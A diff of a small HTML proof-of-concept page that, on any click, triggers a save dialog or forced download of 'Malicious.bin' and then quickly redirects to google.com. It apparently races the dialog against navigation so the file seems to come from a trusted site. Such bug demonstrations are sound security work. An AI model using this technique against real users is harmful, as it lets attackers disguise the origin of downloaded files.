@@ -8,30 +8,21 @@
 <h1>Click anywhere</h1>
 <body>
     <script>
-        document.addEventListener('click', async () =>{
-            setTimeout(async () => {
-                if('showSaveFilePicker' in window){
-                    try{
-                        const handle = await window.showSaveFilePicker({
-                            suggestedName : 'Malicious',
-                            types: [{
-                                description: 'Test Files',
-                                accept: {'text/plain': ['.bin']},
-                            }],
-                        });
-
-                        const writable = await handle.createWritable();
-                        await writable.write('This is only content');
-                        await writable.close();
-                    } catch (err) {
-                    }
-                }
-            }, 1000);
-            setTimeout(() =>{
-                        window.location.href = 'https://google.com';
-
-            }, 1000)
-        });
+        document.addEventListener('click', () => {
+    // Trigger download dialog Android
+    const blob = new Blob(['malicious content'], {type: 'application/octet-stream'});
+    const url = URL.createObjectURL(blob);
+    
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'Malicious.bin';
+    a.click();
+    
+    // Race: navigate after dialog appears
+    setTimeout(() => {
+        window.location.href = 'https://google.com';
+    }, 500);  // Android perlu lebih cepat karena download langsung ke notif bar
+});
     </script>
 </body>
 </html>
